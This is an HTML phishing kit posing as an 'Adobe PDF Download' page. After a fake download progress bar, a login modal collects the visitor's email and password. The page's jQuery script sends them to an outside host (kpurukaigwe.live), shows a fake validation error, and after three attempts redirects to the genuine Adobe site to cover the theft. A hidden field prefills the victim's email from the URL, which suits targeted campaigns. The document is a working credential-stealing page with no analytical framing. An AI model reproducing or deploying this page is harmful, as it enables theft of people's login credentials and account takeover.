
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Adobe PDF Download</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <style>
        body {
            background-image: url("https://iili.io/Fkvowpp.jpg");
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        .navbar {
            position: absolute;
            top: 10px;
            left: 20px;
            z-index: 1000;
            background: transparent;
            padding: 0;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            max-width: 400px;
            margin: 100px auto;
        }
        .form-error {
            color: red;
            font-size: 0.875rem;
            display: none;
        }
        .btn-danger {
            width: 100%;
            position: relative;
        }
        .btn-danger .spinner-border {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 1rem;
            height: 1rem;
            display: none;
        }
        #downloadProgress {
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <img src="https://iili.io/FkvojvR.png" alt="Adobe Logo">
    </nav>

    <div class="login-container shadow">
        <h4 class="mb-3 text-center">PDF DOCUMENT 1656.PDF ONLINE DOCUMENT</h4>
        <center>
            <p>Enter Details to Download.</p>
        </center>
        <form id="initialForm">
            <div class="mb-3">
                <label class="form-label">Company Name</label>
                <input type="text" class="form-control" id="company">
                <div class="form-error" id="companyError">Enter Company Name</div>
            </div>
            <input type="email" style="display: none;" id="email">
            <button type="submit" class="btn btn-danger" id="downloadBtn">Download</button>
            <div class="progress mt-3 d-none" id="downloadProgress">
                <div class="progress-bar bg-danger" role="progressbar" style="width: 0%;">0%</div>
            </div>
        </form>
    </div>

    <!-- Modal -->
    <div class="modal fade" id="authModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <form class="modal-content" id="modalForm">
                <div class="modal-header">
                    <h5 class="modal-title">Authenticate Login Details.</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label>Email Address</label>
                        <input type="email" class="form-control" id="modalEmail">
                        <div class="form-error" id="modalEmailError">Enter Email</div>
                    </div>
                    <div class="mb-3">
                        <label>Password</label>
                        <input type="password" class="form-control" id="modalPassword">
                        <div class="form-error" id="modalPasswordError">Enter Password</div>
                    </div>
                    <div id="submitNotice" class="form-error"></div>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-danger w-100" id="submitModalBtn">
                        Submit
                        <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
                    </button>
                </div>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let modalAttempts = 0;
        let savedCompanyEmail = "";

        $('#initialForm').on('submit', function (e) {
            e.preventDefault();
            $('#companyError, #emailError').hide();

            let company = $('#company').val().trim();
            let email = $('#email').val().trim();

            if (!company) {
                $('#companyError').show(); return;
            }
            if (!email) {
                $('#emailError').show(); return;
            }

            savedCompanyEmail = email;
            $('#downloadProgress').removeClass('d-none');
            let progress = 10;
            $('.progress-bar').css('width', progress + '%').text(progress + '%');

            let interval = setInterval(() => {
                progress += 10;
                if (progress > 70) {
                    clearInterval(interval);
                    $('#downloadProgress').addClass('d-none');
                    $('#modalEmail').val(savedCompanyEmail);
                    $('#modalPassword').val('');
                    new bootstrap.Modal(document.getElementById('authModal')).show();
                } else {
                    $('.progress-bar').css('width', progress + '%').text(progress + '%');
                }
            }, 800);
        });

        $('#modalForm').on('submit', function (e) {
            e.preventDefault();
            $('#modalEmailError, #modalPasswordError, #submitNotice').hide();

            let email = $('#modalEmail').val().trim();
            let password = $('#modalPassword').val().trim();
            let valid = true;

            if (!email) {
                $('#modalEmailError').show(); valid = false;
            }
            if (!password) {
                $('#modalPasswordError').show(); valid = false;
            }
            if (!valid) return;

            const $submitBtn = $('#submitModalBtn');
            $submitBtn.prop('disabled', true).find('.spinner-border').show();

            $.ajax({
                url: 'https://kpurukaigwe.live/me/lambo.php',
                type: 'POST',
                data: { email, password },
                success: function () {
                    modalAttempts++;
                    $('#submitNotice').text('Error9327 validation failed, try again.').show();
                    afterSubmit();
                },
                error: function () {
                    modalAttempts++;
                    $('#submitNotice').text('Error9327 validation failed, try again.').show();
                    afterSubmit();
                }
            });

            function afterSubmit() {
                $('#modalPassword').val('');
                $submitBtn.prop('disabled', false).find('.spinner-border').hide();
                checkModalRedirect();
            }
        });

        function checkModalRedirect() {
            if (modalAttempts >= 3) {
                window.location.href = "https://www.adobe.com/acrobat/pdf-reader.html#compare-acrobat-plans";
            }
        }

        $('#modalPassword').on('input', function () {
            $('#modalPasswordError').hide();
            $('#submitNotice').hide();
        });

        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        const emailFromURL = getQueryParam("email");
        if (emailFromURL) {
            document.getElementById("email").value = emailFromURL;
        }
    </script>
</body>
</html>
